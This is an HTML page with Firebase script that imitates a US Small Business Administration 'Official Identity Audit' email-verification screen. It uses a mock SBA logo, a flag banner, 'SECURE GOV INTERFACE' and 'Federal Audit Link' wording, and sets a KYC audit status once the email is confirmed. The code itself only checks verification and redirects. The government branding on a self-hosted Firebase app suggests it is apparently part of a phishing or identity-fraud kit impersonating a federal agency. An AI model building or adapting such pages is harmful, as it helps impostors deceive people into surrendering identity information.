<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SBA | Verify Case</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;700;900&display=swap');
        :root { --sba-blue: #002e6d; --sba-red: #cc0000; }
        body { font-family: 'Public Sans', sans-serif; background-color: #f1f5f9; -webkit-tap-highlight-color: transparent; }
        
        .gov-top { background: #f0f0f0; color: #444; font-size: 9px; padding: 6px 15px; border-bottom: 1px solid #ddd; font-weight: 700; }
        .sba-logo-box { position: relative; display: inline-block; padding: 2px 6px; }
        .sba-logo-box::before { content: ""; position: absolute; top: 0; left: 0; right: 0; bottom: 4px; border-top: 2px solid var(--sba-blue); border-left: 2px solid var(--sba-blue); border-right: 2px solid var(--sba-blue); }
        .sba-logo-box::after { content: ""; position: absolute; bottom: 0; left: 0; right: 30%; height: 2px; background: var(--sba-red); }

        .auth-card { background: white; border-top: 5px solid var(--sba-blue); box-shadow: 0 4px 20px rgba(0,0,0,0.05); border-radius: 2px; }
        .btn-sba { background-color: var(--sba-blue); transition: all 0.2s; font-size: 11px; font-weight: 900; letter-spacing: 1px; }
        .btn-sba:active { transform: scale(0.98); opacity: 0.9; }

        .verify-pulse { animation: pulse-blue 2s infinite; border-radius: 50%; }
        @keyframes pulse-blue {
            0% { box-shadow: 0 0 0 0 rgba(0, 46, 109, 0.4); }
            70% { box-shadow: 0 0 0 10px rgba(0, 46, 109, 0); }
            100% { box-shadow: 0 0 0 0 rgba(0, 46, 109, 0); }
        }
        
        #displayEmail { text-transform: none !important; word-break: break-all; }
    </style>
</head>
<body class="min-h-screen flex flex-col">

    <div class="gov-top flex items-center justify-between uppercase">
        <div class="flex items-center gap-1.5">
            <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" class="w-3" alt="US Flag">
            <span>Official Identity Audit</span>
        </div>
        <span class="opacity-40">Node-V15</span>
    </div>

    <header class="bg-white border-b border-gray-100 py-3 px-6 flex justify-center shadow-sm">
        <div class="flex items-center gap-2">
            <div class="sba-logo-box"><span class="text-lg font-black text-[#002e6d] tracking-tighter uppercase">SBA</span></div>
            <p class="text-[9px] font-black text-[#002e6d] uppercase leading-none">Administration</p>
        </div>
    </header>

    <main class="flex-grow flex items-center justify-center p-4">
        <div class="w-full max-w-[360px]">
            <div class="auth-card p-6 border border-gray-200">
                
                <div class="mb-5 text-center">
                    <div class="w-12 h-12 bg-slate-50 text-[#002e6d] flex items-center justify-center mx-auto mb-3 border border-[#002e6d] verify-pulse">
                        <i class="fas fa-user-check text-lg"></i>
                    </div>
                    <h2 class="text-lg font-black text-slate-800 uppercase tracking-tighter">Account Audit</h2>
                    <p class="text-slate-400 text-[8px] font-black uppercase tracking-[0.2em] mt-1">Pending Link Activation</p>
                </div>

                <div class="mb-5 text-center bg-slate-50 p-3 border border-slate-100">
                    <p class="text-[8px] text-slate-400 font-bold uppercase mb-1">Authorization Link Sent To:</p>
                    <span id="displayEmail" class="text-[#002e6d] text-xs font-black">loading...</span>
                </div>

                <div id="alertBox" class="hidden mb-4 p-3 bg-red-50 border-l-3 border-red-600 text-red-700 text-[9px] font-black uppercase italic"></div>

                <div class="space-y-3">
                    <div class="p-3 bg-[#001a3d] border border-[#002e6d]">
                        <p class="text-white text-[9px] font-bold uppercase tracking-wider leading-relaxed text-center">
                            The system will <span class="text-sky-400">auto-advance</span><br>immediately upon verification.
                        </p>
                    </div>
                    
                    <button id="checkBtn" class="btn-sba w-full text-white py-4 rounded-sm shadow-lg uppercase">
                        Refresh Status
                    </button>
                </div>

                <div class="mt-6 text-center border-t pt-4 border-slate-50">
                    <button id="resendBtn" class="text-red-600 font-black text-[9px] uppercase tracking-widest hover:underline">
                        Resend Security Link
                    </button>
                </div>
            </div>

            <button id="logoutBtn" class="w-full mt-6 text-slate-400 text-[8px] font-black uppercase tracking-[0.3em]">
                <i class="fas fa-power-off mr-1"></i> Terminate Session
            </button>
        </div>
    </main>

    <footer class="py-4 text-center text-[8px] text-slate-400 font-bold uppercase tracking-widest">
        SECURE GOV INTERFACE © 2026
    </footer>

    <script type="module">
        import { auth, db } from './firebase-config.js';
        import { onAuthStateChanged, signOut, sendEmailVerification } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const displayEmail = document.getElementById('displayEmail');
        const alertBox = document.getElementById('alertBox');
        const checkBtn = document.getElementById('checkBtn');

        onAuthStateChanged(auth, (user) => {
            if (!user) {
                window.location.href = "login.html";
            } else {
                displayEmail.innerText = user.email;
                
                // Real-time checking every 3 seconds
                const interval = setInterval(async () => {
                    await user.reload();
                    if (user.emailVerified) {
                        clearInterval(interval);
                        await finalize(user);
                    }
                }, 3000);
            }
        });

        async function finalize(user) {
            try {
                await updateDoc(doc(db, "users", user.uid), {
                    isVerified: true,
                    accountStatus: "ACTIVE",
                    kycStatus: "PENDING_AUDIT"
                });
                window.location.href = "welcome.html";
            } catch (e) { 
                console.error("Sync Error:", e);
                window.location.href = "welcome.html"; // Fallback redirect
            }
        }

        checkBtn.onclick = async () => {
            const user = auth.currentUser;
            if (!user) return;
            
            checkBtn.disabled = true;
            checkBtn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i>';
            
            await user.reload();
            if (user.emailVerified) {
                finalize(user);
            } else {
                alertBox.innerText = "LINK NOT ACTIVATED. CHECK YOUR INBOX OR SPAM.";
                alertBox.classList.remove('hidden');
                checkBtn.disabled = false;
                checkBtn.innerText = 'Refresh Status';
            }
        };

        document.getElementById('resendBtn').onclick = async () => {
            try {
                await sendEmailVerification(auth.currentUser);
                alert("Federal Audit Link Resent. Check your inbox.");
            } catch (err) { 
                alert("Rate limit exceeded. Try again in 60 seconds."); 
            }
        };

        document.getElementById('logoutBtn').onclick = () => {
            signOut(auth).then(() => { window.location.href = "login.html"; });
        };
    </script>
</body>
</html>
